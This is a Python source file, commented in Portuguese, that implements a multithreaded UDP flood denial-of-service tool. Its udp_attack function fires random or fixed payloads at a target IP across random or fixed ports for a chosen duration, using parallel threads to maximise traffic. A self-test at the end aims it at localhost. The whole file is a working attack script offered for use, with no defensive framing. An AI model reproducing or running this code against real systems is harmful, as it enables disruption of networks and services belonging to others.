#!/usr/bin/env python3
"""
UDP Flood — envia pacotes UDP randômicos para esgotar banda.
Dois modos:
  - randomize=True (default): payload e portas aleatórios
  - randomize=False (UDP_PLAIN): payload fixo, porta fixa
"""

import socket
import random
import time
import threading


def udp_attack(target_ip: str, target_port: int = 80, duration: int = 60,
               stop_event: threading.Event = None, randomize: bool = True,
               threads: int = 4):
    """
    UDP Flood attack.
    
    Args:
        target_ip: IP do alvo
        target_port: Porta alvo
        duration: Duração em segundos
        stop_event: Evento para parar o ataque
        randomize: Se True, randomiza payload e portas
        threads: Número de threads paralelas
    """
    
    if stop_event is None:
        stop_event = threading.Event()
    
    def flood_worker(worker_id: int):
        """Worker thread que envia pacotes UDP."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Aumenta buffer de envio
            try:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
            except:
                pass
            
            end_time = time.time() + duration
            
            while time.time() < end_time:
                if stop_event.is_set():
                    break
                
                if randomize:
                    # Porta aleatória
                    port = random.randint(1, 65535)
                    # Payload aleatório (tamanho variável)
                    payload_size = random.randint(256, 1500)
                    payload = random.randbytes(payload_size)
                else:
                    port = target_port
                    payload = b'\x00' * 1024  # Payload fixo
                
                try:
                    sock.sendto(payload, (target_ip, port))
                except:
                    pass
                
                # Pequena pausa para evitar CPU 100%
                if not randomize:
                    time.sleep(0.001)
            
            sock.close()
        except Exception as e:
            print(f"[!] Worker {worker_id} erro: {e}")
    
    # Cria múltiplas threads para maximizar throughput
    workers = []
    for i in range(threads):
        t = threading.Thread(target=flood_worker, args=(i,), daemon=True)
        t.start()
        workers.append(t)
    
    # Aguarda até o fim
    for t in workers:
        t.join()


if __name__ == '__main__':
    # Teste rápido
    print("[*] Testando UDP flood por 5 segundos...")
    stop = threading.Event()
    t = threading.Thread(target=udp_attack, args=('127.0.0.1', 9999, 5, stop))
    t.start()
    time.sleep(5)
    stop.set()
    print("[*] Teste finalizado.")
